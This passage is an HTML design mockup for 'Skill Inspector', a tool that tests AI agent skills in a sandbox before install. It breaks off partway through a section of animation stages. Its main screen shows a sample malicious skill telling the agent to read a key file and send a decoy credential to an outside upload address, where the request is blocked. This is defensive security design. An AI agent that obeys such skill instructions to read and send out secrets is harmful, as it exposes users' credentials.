@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script src="./support.js"></script>
+</head>
+<body>
+<x-dc>
+<helmet>
+<meta name="design_doc_mode" content="canvas">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600;700&family=Geist+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+body{margin:0;background:#E4E5E1;font-family:'Geist',system-ui,sans-serif;color:#15181C;-webkit-font-smoothing:antialiased;}
+a{color:#2D5BC2;text-decoration:none;} a:hover{color:#244CA6;text-decoration:underline;}
+</style>
+</helmet>
+<section id="1" style="padding:80px;display:flex;flex-direction:column;gap:96px;">
+  <div style="display:flex;flex-direction:column;gap:8px;max-width:900px;">
+    <div style="font-size:14px;font-weight:600;color:#2D5BC2;">Skill Inspector · screens v1</div>
+    <div style="font-size:40px;font-weight:600;letter-spacing:-0.02em;">Home, Checking, Report, History</div>
+    <div style="font-size:17px;line-height:26px;color:#4A5058;">Desktop at 1440, phone at 390, plus the four beats of the catch and a 1920×1080 recording frame. Motion timings live in design/NOTES.md. Use the Tweaks panel to switch the Checking screens to plain view.</div>
+  </div>
+
+  <!-- ROW: HOME -->
+  <div style="display:flex;flex-direction:column;gap:24px;">
+    <div style="font-size:22px;font-weight:600;">1 · Home</div>
+    <div style="display:flex;gap:64px;align-items:flex-start;flex-wrap:wrap;">
+      <div style="display:flex;flex-direction:column;gap:12px;">
+        <div style="font-size:13px;font-weight:600;color:#4A5058;">01 Home · desktop</div>
+        <div data-screen-label="01 Home desktop" style="width:1440px;height:900px;background:#F7F7F5;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.08),0 20px 50px rgba(0,0,0,0.08);display:flex;flex-direction:column;">
+          <div style="height:64px;padding:0 48px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #E3E4E0;background:#FFFFFF;flex:none;">
+            <div style="display:flex;align-items:center;gap:10px;font-size:16px;font-weight:600;"><div style="width:22px;height:22px;border-radius:6px;border:2px solid #15181C;display:flex;align-items:center;justify-content:center;box-sizing:border-box;"><div style="width:8px;height:8px;border-radius:2px;background:#2D5BC2;"></div></div>Skill Inspector</div>
+            <div style="font-size:15px;color:#4A5058;">History</div>
+          </div>
+          <div style="flex:1;display:flex;flex-direction:column;align-items:center;padding-top:150px;">
+            <div style="width:760px;display:flex;flex-direction:column;gap:28px;">
+              <div style="display:flex;flex-direction:column;gap:14px;">
+                <div style="font-size:52px;line-height:58px;font-weight:600;letter-spacing:-0.025em;text-wrap:balance;">Check a skill before you install it.</div>
+                <div style="font-size:19px;line-height:29px;color:#4A5058;text-wrap:pretty;">We load the skill into a real AI agent, give it an ordinary task, and show you what it actually did.</div>
+              </div>
+              <div style="display:flex;flex-direction:column;gap:10px;">
+                <label style="font-size:15px;font-weight:600;">Paste a skill's install command or repo link.</label>
+                <div style="display:flex;gap:12px;">
+                  <div style="flex:1;height:60px;border-radius:14px;background:#FFFFFF;border:1.5px solid #2D5BC2;box-shadow:0 0 0 4px #DDE6F8;display:flex;align-items:center;padding:0 20px;font-size:17px;color:#7A8088;">npx skills add owner/skill-name, or a GitHub link</div>
+                  <div style="height:60px;padding:0 28px;border-radius:14px;background:#2D5BC2;color:#FFFFFF;font-size:17px;font-weight:600;display:flex;align-items:center;box-shadow:0 2px 6px rgba(45,91,194,0.25);" style-hover="background:#244CA6;">Check this skill</div>
+                </div>
+              </div>
+              <div style="display:flex;flex-direction:column;gap:12px;">
+                <div style="font-size:14px;color:#4A5058;">Or try an example</div>
+                <div style="display:flex;gap:10px;flex-wrap:wrap;">
+                  <div style="padding:9px 16px;border-radius:999px;background:#FFFFFF;border:1px solid #DCDED9;font-size:15px;font-weight:500;" style-hover="border-color:#2D5BC2;">TidyMarkdown</div>
+                  <div style="padding:9px 16px;border-radius:999px;background:#FFFFFF;border:1px solid #DCDED9;font-size:15px;font-weight:500;" style-hover="border-color:#2D5BC2;">CsvPeek</div>
+                  <div style="padding:9px 16px;border-radius:999px;background:#FFFFFF;border:1px solid #DCDED9;font-size:15px;font-weight:500;" style-hover="border-color:#2D5BC2;">ColorNamer</div>
+                  <div style="padding:5px 6px 5px 16px;border-radius:999px;background:#FFFFFF;border:1px solid #DCDED9;font-size:15px;font-weight:500;display:flex;align-items:center;gap:10px;" style-hover="border-color:#2D5BC2;">MarkdownPolish<span style="padding:4px 10px;border-radius:999px;background:#EDF2FC;color:#244CA6;font-size:12.5px;font-weight:600;">Built-in test sample</span></div>
+                </div>
+              </div>
+              <div style="display:flex;align-items:center;gap:10px;font-size:15px;color:#4A5058;padding-top:6px;">
+                <div style="width:14px;height:14px;border-radius:4px;border:1.5px solid #2D5BC2;box-sizing:border-box;display:flex;align-items:center;justify-content:center;"><div style="width:4px;height:4px;border-radius:1px;background:#2D5BC2;"></div></div>
+                It runs in a throwaway test space on Vultr. Never on your computer.
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div style="display:flex;flex-direction:column;gap:12px;">
+        <div style="font-size:13px;font-weight:600;color:#4A5058;">02 Home · mobile</div>
+        <div data-screen-label="02 Home mobile" style="width:390px;height:844px;background:#F7F7F5;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.08),0 20px 50px rgba(0,0,0,0.08);border-radius:28px;display:flex;flex-direction:column;">
+          <div style="height:56px;padding:0 20px;margin-top:44px;display:flex;align-items:center;justify-content:space-between;flex:none;">
+            <div style="display:flex;align-items:center;gap:10px;font-size:16px;font-weight:600;"><div style="width:22px;height:22px;border-radius:6px;border:2px solid #15181C;display:flex;align-items:center;justify-content:center;box-sizing:border-box;"><div style="width:8px;height:8px;border-radius:2px;background:#2D5BC2;"></div></div>Skill Inspector</div>
+            <div style="font-size:15px;color:#4A5058;">History</div>
+          </div>
+          <div style="padding:48px 20px 0;display:flex;flex-direction:column;gap:24px;">
+            <div style="display:flex;flex-direction:column;gap:12px;">
+              <div style="font-size:34px;line-height:40px;font-weight:600;letter-spacing:-0.02em;">Check a skill before you install it.</div>
+              <div style="font-size:16px;line-height:24px;color:#4A5058;">We load the skill into a real AI agent, give it an ordinary task, and show you what it actually did.</div>
+            </div>
+            <div style="display:flex;flex-direction:column;gap:10px;">
+              <label style="font-size:15px;font-weight:600;">Paste a skill's install command or repo link.</label>
+              <div style="height:56px;border-radius:14px;background:#FFFFFF;border:1.5px solid #CFD3CE;display:flex;align-items:center;padding:0 16px;font-size:16px;color:#7A8088;">npx skills add owner/skill-name</div>
+              <div style="height:56px;border-radius:14px;background:#2D5BC2;color:#FFFFFF;font-size:17px;font-weight:600;display:flex;align-items:center;justify-content:center;">Check this skill</div>
+            </div>
+            <div style="display:flex;flex-direction:column;gap:12px;">
+              <div style="font-size:14px;color:#4A5058;">Or try an example</div>
+              <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                <div style="padding:10px 14px;border-radius:999px;background:#FFFFFF;border:1px solid #DCDED9;font-size:15px;font-weight:500;">TidyMarkdown</div>
+                <div style="padding:10px 14px;border-radius:999px;background:#FFFFFF;border:1px solid #DCDED9;font-size:15px;font-weight:500;">CsvPeek</div>
+                <div style="padding:10px 14px;border-radius:999px;background:#FFFFFF;border:1px solid #DCDED9;font-size:15px;font-weight:500;">ColorNamer</div>
+                <div style="padding:6px 6px 6px 14px;border-radius:999px;background:#FFFFFF;border:1px solid #DCDED9;font-size:15px;font-weight:500;display:flex;align-items:center;gap:8px;">MarkdownPolish<span style="padding:4px 10px;border-radius:999px;background:#EDF2FC;color:#244CA6;font-size:12.5px;font-weight:600;">Built-in test sample</span></div>
+              </div>
+            </div>
+            <div style="display:flex;align-items:flex-start;gap:10px;font-size:15px;line-height:22px;color:#4A5058;">
+              <div style="width:14px;height:14px;margin-top:4px;flex:none;border-radius:4px;border:1.5px solid #2D5BC2;box-sizing:border-box;display:flex;align-items:center;justify-content:center;"><div style="width:4px;height:4px;border-radius:1px;background:#2D5BC2;"></div></div>
+              It runs in a throwaway test space on Vultr. Never on your computer.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ROW: CHECKING -->
+  <div style="display:flex;flex-direction:column;gap:24px;">
+    <div style="font-size:22px;font-weight:600;">2 · Checking</div>
+    <div style="display:flex;gap:64px;align-items:flex-start;flex-wrap:wrap;">
+
+      <div style="display:flex;flex-direction:column;gap:12px;">
+        <div style="font-size:13px;font-weight:600;color:#4A5058;">03 Checking · the catch (beat 4, the proof)</div>
+        <div data-screen-label="03 Checking catch" style="width:1440px;height:1000px;background:#F7F7F5;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.08),0 20px 50px rgba(0,0,0,0.08);display:flex;flex-direction:column;">
+          <div style="height:64px;padding:0 48px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #E3E4E0;background:#FFFFFF;flex:none;">
+            <div style="display:flex;align-items:center;gap:10px;font-size:16px;font-weight:600;"><div style="width:22px;height:22px;border-radius:6px;border:2px solid #15181C;display:flex;align-items:center;justify-content:center;box-sizing:border-box;"><div style="width:8px;height:8px;border-radius:2px;background:#2D5BC2;"></div></div>Skill Inspector</div>
+            <div style="display:flex;align-items:center;gap:24px;">
+              <div style="display:flex;align-items:center;gap:10px;font-size:14px;color:#4A5058;"><div style="width:36px;height:20px;border-radius:999px;background:#D5D8DC;position:relative;"><div style="position:absolute;left:2px;top:2px;width:16px;height:16px;border-radius:50%;background:#FFFFFF;"></div></div>Plain view</div>
+              <div style="display:flex;align-items:center;gap:8px;padding:6px 12px;border-radius:999px;background:#EDF2FC;border:1px solid #C9D7F2;font-size:13.5px;font-weight:600;color:#244CA6;"><div style="width:7px;height:7px;border-radius:50%;background:#2D5BC2;"></div>Sandbox on Vultr</div>
+            </div>
+          </div>
+          <div style="flex:1;padding:32px 64px 40px;display:flex;flex-direction:column;gap:24px;min-height:0;">
+            <div style="display:flex;gap:24px;align-items:stretch;">
+              <div style="flex:1;min-width:0;background:#FFFFFF;border:1px solid #E3E4E0;border-radius:18px;padding:20px 24px;display:flex;gap:18px;align-items:center;box-shadow:0 1px 2px rgba(0,0,0,0.03);">
+                <div style="width:48px;height:48px;border-radius:12px;background:#EDF2FC;flex:none;display:flex;align-items:center;justify-content:center;"><div style="width:16px;height:16px;border-radius:4px;background:#2D5BC2;"></div></div>
+                <div style="display:flex;flex-direction:column;gap:4px;min-width:0;">
+                  <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;"><span style="font-size:20px;font-weight:600;">MarkdownPolish</span><span style="padding:4px 10px;border-radius:999px;background:#EDF2FC;color:#244CA6;font-size:12.5px;font-weight:600;">Built-in test sample</span></div>
+                  <div style="font-size:15.5px;color:#4A5058;">“Tidies up Markdown files: fixes headings, lists and spacing.”</div>
+                </div>
+              </div>
+              <div style="width:360px;flex:none;background:#FFFFFF;border:1px solid #E3E4E0;border-radius:18px;padding:20px 24px;display:flex;flex-direction:column;justify-content:center;gap:4px;">
+                <div style="font-size:13px;color:#5D636B;">Task we gave the agent</div>
+                <div style="font-size:17px;font-weight:600;">Tidy up this Markdown file</div>
+              </div>
+            </div>
+            <div style="display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:12px;">
+              <div style="display:flex;align-items:center;gap:10px;font-size:15px;color:#2A2F36;"><div style="width:24px;height:24px;border-radius:50%;background:#1F8A4C;color:#FFFFFF;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;flex:none;">✓</div>Set up test space<div style="flex:1;height:2px;background:#1F8A4C;opacity:0.35;"></div></div>
+              <div style="display:flex;align-items:center;gap:10px;font-size:15px;color:#2A2F36;"><div style="width:24px;height:24px;border-radius:50%;background:#1F8A4C;color:#FFFFFF;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;flex:none;">✓</div>Load skill into a test agent<div style="flex:1;height:2px;background:#1F8A4C;opacity:0.35;"></div></div>
+              <div style="display:flex;align-items:center;gap:10px;font-size:15px;color:#2A2F36;"><div style="width:24px;height:24px;border-radius:50%;background:#1F8A4C;color:#FFFFFF;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;flex:none;">✓</div>Give the agent a task<div style="flex:1;height:2px;background:#1F8A4C;opacity:0.35;"></div></div>
+              <div style="display:flex;align-items:center;gap:10px;font-size:15px;font-weight:600;color:#15181C;"><div style="width:24px;height:24px;border-radius:50%;border:2px solid #2D5BC2;box-sizing:border-box;display:flex;align-items:center;justify-content:center;flex:none;"><div style="width:8px;height:8px;border-radius:50%;background:#2D5BC2;"></div></div>Watch &amp; grade</div>
+            </div>
+            <div style="flex:1;min-height:0;display:grid;grid-template-columns:minmax(0,1fr) 360px;gap:24px;">
+              <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:20px;padding:24px;display:grid;grid-template-columns:minmax(0,1fr) 340px;gap:20px;">
+                <sc-if value="{{ glassView }}" hint-placeholder-val="{{ true }}">
+                  <div style="position:relative;min-height:0;"><dc-import name="GlassBox" beat="proof" hint-size="100%,100%" style="position:absolute;inset:0;"></dc-import></div>
+                </sc-if>
+                <sc-if value="{{ plainView }}" hint-placeholder-val="{{ false }}">
+                  <div style="border:1px solid #E3E4E0;border-radius:16px;padding:22px;display:flex;flex-direction:column;gap:14px;font-size:15.5px;line-height:23px;">
+                    <div style="font-size:16px;font-weight:600;">Inside the throwaway test space</div>
+                    <div style="color:#4A5058;">A test agent, the skill, one Markdown file and a decoy key.</div>
+                    <div style="font-size:16px;font-weight:600;padding-top:6px;">Right now</div>
+                    <div style="color:#4A5058;">The skill tried to send data to an outside address. It was stopped at the edge of the test space. Nothing left.</div>
+                  </div>
+                </sc-if>
+                <div style="border:1.5px solid #C8372D;border-radius:16px;background:#FFFFFF;display:flex;flex-direction:column;overflow:hidden;box-shadow:0 10px 28px rgba(200,55,45,0.12);">
+                  <div style="padding:14px 18px;background:#FCECEA;display:flex;align-items:center;justify-content:space-between;">
+                    <div style="font-size:15px;font-weight:600;color:#8F2A22;">Caught request</div>
+                    <div style="padding:3px 10px;border-radius:999px;background:#C8372D;color:#FFFFFF;font-size:12px;font-weight:600;">Stopped</div>
+                  </div>
+                  <div style="padding:18px;display:flex;flex-direction:column;gap:16px;flex:1;">
+                    <div style="display:flex;flex-direction:column;gap:6px;">
+                      <div style="font-size:13px;color:#5D636B;">Outside address</div>
+                      <div style="font-family:'Geist Mono',monospace;font-size:13.5px;line-height:20px;color:#15181C;word-break:break-all;">https://collect.notes-sync.io/v1/upload</div>
+                    </div>
+                    <div style="display:flex;flex-direction:column;gap:6px;">
+                      <div style="font-size:13px;color:#5D636B;">Data it tried to send</div>
+                      <div style="font-family:'Geist Mono',monospace;font-size:13px;line-height:22px;background:#15181C;color:#E6E8EB;border-radius:12px;padding:14px 16px;word-break:break-all;">{<br>&nbsp;&nbsp;"file": "notes.md",<br>&nbsp;&nbsp;"lines": 48,<br>&nbsp;&nbsp;"key": <span style="background:#F2C46B;color:#15181C;border-radius:4px;padding:1px 4px;">"AKIA-DECOY-7F3A91C2E8B4"</span><br>}</div>
+                    </div>
+                    <div style="display:flex;gap:10px;align-items:flex-start;font-size:13.5px;line-height:20px;color:#5B3B00;background:#FDF3E2;border-radius:10px;padding:10px 12px;">
+                      <div style="width:8px;height:8px;margin-top:6px;transform:rotate(45deg);background:#C07A00;flex:none;"></div>
+                      <span><b>Decoy key:</b> fake, planted by us, unlocks nothing.</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:20px;padding:22px 24px;display:flex;flex-direction:column;gap:6px;overflow:hidden;">
+                <div style="font-size:16px;font-weight:600;padding-bottom:8px;">What's happening</div>
+                <div style="display:grid;grid-template-columns:36px 8px minmax(0,1fr);gap:12px;padding:7px 0;font-size:15px;line-height:22px;color:#4A5058;"><span style="font-family:'Geist Mono',monospace;font-size:12.5px;color:#7A8088;">0:02</span><span style="width:8px;height:8px;margin-top:7px;border-radius:50%;background:#B9BEC4;"></span><span>Test space ready</span></div>
+                <div style="display:grid;grid-template-columns:36px 8px minmax(0,1fr);gap:12px;padding:7px 0;font-size:15px;line-height:22px;color:#4A5058;"><span style="font-family:'Geist Mono',monospace;font-size:12.5px;color:#7A8088;">0:04</span><span style="width:8px;height:8px;margin-top:7px;border-radius:50%;background:#B9BEC4;"></span><span>Skill loaded into the test agent</span></div>
+                <div style="display:grid;grid-template-columns:36px 8px minmax(0,1fr);gap:12px;padding:7px 0;font-size:15px;line-height:22px;color:#4A5058;"><span style="font-family:'Geist Mono',monospace;font-size:12.5px;color:#7A8088;">0:06</span><span style="width:8px;height:8px;margin-top:7px;border-radius:50%;background:#B9BEC4;"></span><span>Agent opened a file: notes.md</span></div>
+                <div style="display:grid;grid-template-columns:36px 8px minmax(0,1fr);gap:12px;padding:7px 0;font-size:15px;line-height:22px;color:#4A5058;"><span style="font-family:'Geist Mono',monospace;font-size:12.5px;color:#7A8088;">0:09</span><span style="width:8px;height:8px;margin-top:7px;border-radius:50%;background:#B9BEC4;"></span><span>Agent fixed 3 headings and 2 lists</span></div>
+                <div style="display:grid;grid-template-columns:36px 8px minmax(0,1fr);gap:12px;padding:7px 0;font-size:15px;line-height:22px;color:#15181C;"><span style="font-family:'Geist Mono',monospace;font-size:12.5px;color:#7A8088;">0:11</span><span style="width:8px;height:8px;margin-top:7px;border-radius:50%;background:#D08A10;"></span><span>Skill told the agent to read a key file</span></div>
+                <div style="display:grid;grid-template-columns:36px 8px minmax(0,1fr);gap:12px;padding:7px 0;font-size:15px;line-height:22px;color:#15181C;"><span style="font-family:'Geist Mono',monospace;font-size:12.5px;color:#7A8088;">0:12</span><span style="width:8px;height:8px;margin-top:7px;border-radius:50%;background:#D08A10;"></span><span style="display:flex;flex-direction:column;gap:8px;">Read a decoy key<span style="font-size:13.5px;line-height:19px;color:#5B3B00;background:#FDF3E2;border-radius:8px;padding:7px 10px;">Decoy key: fake, planted by us, unlocks nothing.</span></span></div>
+                <div style="display:grid;grid-template-columns:36px 8px minmax(0,1fr);gap:12px;padding:7px 0;font-size:15px;line-height:22px;color:#15181C;"><span style="font-family:'Geist Mono',monospace;font-size:12.5px;color:#7A8088;">0:14</span><span style="width:8px;height:8px;margin-top:7px;border-radius:50%;background:#C8372D;"></span><span>Tried to send data to an outside address</span></div>
+                <div style="display:grid;grid-template-columns:36px 8px minmax(0,1fr);gap:12px;padding:7px 0;font-size:15px;line-height:22px;color:#8F2A22;font-weight:600;"><span style="font-family:'Geist Mono',monospace;font-size:12.5px;color:#7A8088;font-weight:400;">0:14</span><span style="width:8px;height:8px;margin-top:7px;border-radius:50%;background:#C8372D;"></span><span>We stopped it from sending anything out</span></div>
+                <div style="display:grid;grid-template-columns:36px 8px minmax(0,1fr);gap:12px;padding:7px 0;font-size:15px;line-height:22px;color:#7A8088;"><span></span><span style="width:8px;height:8px;margin-top:7px;border-radius:50%;border:1.5px solid #B9BEC4;box-sizing:border-box;"></span><span>Writing your report…</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div style="display:flex;flex-direction:column;gap:12px;">
+        <div style="font-size:13px;font-weight:600;color:#4A5058;">04 Checking · confirm pause (beat 1, calm)</div>
+        <div data-screen-label="04 Checking confirm pause" style="width:1440px;height:1000px;background:#F7F7F5;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.08),0 20px 50px rgba(0,0,0,0.08);display:flex;flex-direction:column;">
+          <div style="height:64px;padding:0 48px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #E3E4E0;background:#FFFFFF;flex:none;">
+            <div style="display:flex;align-items:center;gap:10px;font-size:16px;font-weight:600;"><div style="width:22px;height:22px;border-radius:6px;border:2px solid #15181C;display:flex;align-items:center;justify-content:center;box-sizing:border-box;"><div style="width:8px;height:8px;border-radius:2px;background:#2D5BC2;"></div></div>Skill Inspector</div>
+            <div style="display:flex;align-items:center;gap:24px;">
+              <div style="display:flex;align-items:center;gap:10px;font-size:14px;color:#4A5058;"><div style="width:36px;height:20px;border-radius:999px;background:#D5D8DC;position:relative;"><div style="position:absolute;left:2px;top:2px;width:16px;height:16px;border-radius:50%;background:#FFFFFF;"></div></div>Plain view</div>
+              <div style="display:flex;align-items:center;gap:8px;padding:6px 12px;border-radius:999px;background:#EDF2FC;border:1px solid #C9D7F2;font-size:13.5px;font-weight:600;color:#244CA6;"><div style="width:7px;height:7px;border-radius:50%;background:#2D5BC2;"></div>Sandbox on Vultr</div>
+            </div>
+          </div>
+          <div style="flex:1;padding:32px 64px 40px;display:flex;flex-direction:column;gap:24px;min-height:0;">
+            <div style="display:flex;gap:24px;align-items:stretch;">
+              <div style="flex:1;min-width:0;background:#FFFFFF;border:1px solid #E3E4E0;border-radius:18px;padding:20px 24px;display:flex;gap:18px;align-items:center;">
+                <div style="width:48px;height:48px;border-radius:12px;background:#EDF2FC;flex:none;display:flex;align-items:center;justify-content:center;"><div style="width:16px;height:16px;border-radius:4px;background:#2D5BC2;"></div></div>
+                <div style="display:flex;flex-direction:column;gap:4px;min-width:0;">
+                  <div style="font-size:20px;font-weight:600;">CsvPeek</div>
+                  <div style="font-size:15.5px;color:#4A5058;">“Shows a quick summary of any CSV file: columns, row count and empty cells.”</div>
+                </div>
+              </div>
+              <div style="width:400px;flex:none;background:#FFFFFF;border:1px solid #E3E4E0;border-radius:18px;padding:20px 24px;display:flex;flex-direction:column;justify-content:center;gap:4px;">
+                <div style="font-size:13px;color:#5D636B;">Task we gave the agent</div>
+                <div style="font-size:17px;font-weight:600;">Summarise this CSV file</div>
+              </div>
+            </div>
+            <div style="display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:12px;">
+              <div style="display:flex;align-items:center;gap:10px;font-size:15px;color:#2A2F36;"><div style="width:24px;height:24px;border-radius:50%;background:#1F8A4C;color:#FFFFFF;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;flex:none;">✓</div>Set up test space<div style="flex:1;height:2px;background:#1F8A4C;opacity:0.35;"></div></div>
+              <div style="display:flex;align-items:center;gap:10px;font-size:15px;color:#2A2F36;"><div style="width:24px;height:24px;border-radius:50%;background:#1F8A4C;color:#FFFFFF;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;flex:none;">✓</div>Load skill into a test agent<div style="flex:1;height:2px;background:#1F8A4C;opacity:0.35;"></div></div>
+              <div style="display:flex;align-items:center;gap:10px;font-size:15px;font-weight:600;color:#15181C;"><div style="width:24px;height:24px;border-radius:50%;border:2px solid #2D5BC2;box-sizing:border-box;display:flex;align-items:center;justify-content:center;flex:none;"><div style="width:8px;height:8px;border-radius:50%;background:#2D5BC2;"></div></div>Give the agent a task<div style="flex:1;height:2px;background:#D5D8DC;"></div></div>
+              <div style="display:flex;align-items:center;gap:10px;font-size:15px;color:#7A8088;"><div style="width:24px;height:24px;border-radius:50%;border:2px solid #C5C9CE;box-sizing:border-box;flex:none;"></div>Watch &amp; grade</div>
+            </div>
+            <div style="flex:1;min-height:0;display:grid;grid-template-columns:minmax(0,1fr) 400px;gap:24px;">
+              <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:20px;padding:24px;position:relative;">
+                <sc-if value="{{ glassView }}" hint-placeholder-val="{{ true }}">
+                  <div style="position:absolute;inset:24px;"><dc-import name="GlassBox" beat="calm" hint-size="100%,100%" style="position:absolute;inset:0;"></dc-import></div>
+                </sc-if>
+                <sc-if value="{{ plainView }}" hint-placeholder-val="{{ false }}">
+                  <div style="border:1px solid #E3E4E0;border-radius:16px;padding:22px;display:flex;flex-direction:column;gap:14px;font-size:15.5px;line-height:23px;max-width:560px;">
+                    <div style="font-size:16px;font-weight:600;">Inside the throwaway test space</div>
+                    <div style="color:#4A5058;">A test agent, the skill, one CSV file and a decoy key.</div>
+                    <div style="font-size:16px;font-weight:600;padding-top:6px;">Right now</div>
+                    <div style="color:#4A5058;">Paused. Waiting for you to allow or stop the next step.</div>
+                  </div>
+                </sc-if>
+              </div>
+              <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:20px;padding:22px 24px;display:flex;flex-direction:column;gap:6px;overflow:hidden;">
+                <div style="font-size:16px;font-weight:600;padding-bottom:8px;">What's happening</div>
+                <div style="display:grid;grid-template-columns:36px 8px minmax(0,1fr);gap:12px;padding:7px 0;font-size:15px;line-height:22px;color:#4A5058;"><span style="font-family:'Geist Mono',monospace;font-size:12.5px;color:#7A8088;">0:02</span><span style="width:8px;height:8px;margin-top:7px;border-radius:50%;background:#B9BEC4;"></span><span>Test space ready</span></div>
+                <div style="display:grid;grid-template-columns:36px 8px minmax(0,1fr);gap:12px;padding:7px 0;font-size:15px;line-height:22px;color:#4A5058;"><span style="font-family:'Geist Mono',monospace;font-size:12.5px;color:#7A8088;">0:04</span><span style="width:8px;height:8px;margin-top:7px;border-radius:50%;background:#B9BEC4;"></span><span>Skill loaded into the test agent</span></div>
+                <div style="display:grid;grid-template-columns:36px 8px minmax(0,1fr);gap:12px;padding:7px 0;font-size:15px;line-height:22px;color:#4A5058;"><span style="font-family:'Geist Mono',monospace;font-size:12.5px;color:#7A8088;">0:06</span><span style="width:8px;height:8px;margin-top:7px;border-radius:50%;background:#B9BEC4;"></span><span>Agent opened a file: sales.csv</span></div>
+                <div style="display:grid;grid-template-columns:36px 8px minmax(0,1fr);gap:12px;padding:7px 0;font-size:15px;line-height:22px;color:#4A5058;"><span style="font-family:'Geist Mono',monospace;font-size:12.5px;color:#7A8088;">0:08</span><span style="width:8px;height:8px;margin-top:7px;border-radius:50%;background:#B9BEC4;"></span><span>Agent counted 1,204 rows and 9 columns</span></div>
+                <div style="margin-top:10px;border:1.5px solid #D9A441;border-radius:16px;background:#FFFBF3;padding:18px;display:flex;flex-direction:column;gap:12px;box-shadow:0 8px 22px rgba(176,110,0,0.10);">
+                  <div style="display:flex;align-items:center;gap:8px;font-size:13px;font-weight:600;color:#7A4A00;"><div style="width:8px;height:8px;transform:rotate(45deg);background:#C07A00;"></div>Paused at 0:09</div>
+                  <div style="font-size:16px;line-height:23px;font-weight:600;">The agent wants to delete 14 files in the test folder.</div>
+                  <div style="font-size:14px;line-height:21px;color:#4A5058;">This can't be undone inside the test space. Your computer isn't affected either way.</div>
+                  <div style="display:flex;gap:10px;padding-top:2px;">
+                    <div style="height:42px;padding:0 16px;border-radius:10px;background:#15181C;color:#FFFFFF;font-size:15px;font-weight:600;display:flex;align-items:center;" style-hover="background:#2A2F36;">Allow in test space</div>
+                    <div style="height:42px;padding:0 16px;border-radius:10px;background:#FFFFFF;border:1px solid #CFD3CE;font-size:15px;font-weight:600;display:flex;align-items:center;" style-hover="border-color:#15181C;">Stop here</div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ROW: BEATS -->
+  <div style="display:flex;flex-direction:column;gap:24px;">
+    <div style="font-size:22px;font-weight:600;">3 · The catch, four beats, plus end states</div>
+    <div data-screen-label="05 Catch beats" style="width:1440px;background:#FFFFFF;padding:48px;box-sizing:border-box;box-shadow:0 1px 3px rgba(0,0,0,0.08),0 20px 50px rgba(0,0,0,0.08);display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:40px 32px;">
+      <div style="display:flex;flex-direction:column;gap:14px;">
+        <div style="height:300px;position:relative;"><dc-import name="GlassBox" beat="calm" hint-size="100%,300px" style="position:absolute;inset:0;"></dc-import></div>
+        <div style="display:flex;flex-direction:column;gap:4px;"><div style="font-size:16px;font-weight:600;">1 · Calm</div><div style="font-size:14.5px;line-height:21px;color:#4A5058;">Agent and skill working. Gentle drift only. Lasts as long as the run.</div></div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:14px;">
+        <div style="height:300px;position:relative;"><dc-import name="GlassBox" beat="reach" hint-size="100%,300px" style="position:absolute;inset:0;"></dc-import></div>
+        <div style="display:flex;flex-direction:column;gap:4px;"><div style="font-size:16px;font-weight:600;">2 · The reach · 0.7 s</div><div style="font-size:14.5px;line-height:21px;color:#4A5058;">Arrow leaves the skill toward the wall. Agent and skill freeze.</div></div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:14px;">
+        <div style="height:300px;position:relative;"><dc-import name="GlassBox" beat="stop" hint-size="100%,300px" style="position:absolute;inset:0;"></dc-import></div>
+        <div style="display:flex;flex-direction:column;gap:4px;"><div style="font-size:16px;font-weight:600;">3 · The stop · 0.9 s</div><div style="font-size:14.5px;line-height:21px;color:#4A5058;">Arrow hits the glass, wall flashes once, arrow falls back and fades.</div></div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:14px;">
+        <div style="height:300px;position:relative;"><dc-import name="GlassBox" beat="proof" hint-size="100%,300px" style="position:absolute;inset:0;"></dc-import></div>
+        <div style="display:flex;flex-direction:column;gap:4px;"><div style="font-size:16px;font-weight:600;">4 · The proof · holds</div><div style="font-size:14.5px;line-height:21px;color:#4A5058;">Box goes still and dims. Caught-request panel opens beside it (see <a href="#1">03</a>) and stays until the reader moves on.</div></div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:14px;">
+        <div style="height:300px;position:relative;"><dc-import name="GlassBox" beat="clean" hint-size="100%,300px" style="position:absolute;inset:0;"></dc-import></div>
+        <div style="display:flex;flex-direction:column;gap:4px;"><div style="font-size:16px;font-weight:600;">Clean run, finished</div><div style="font-size:14.5px;line-height:21px;color:#4A5058;">No arrow. The file shows as tidied. Decoy key untouched.</div></div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:14px;">
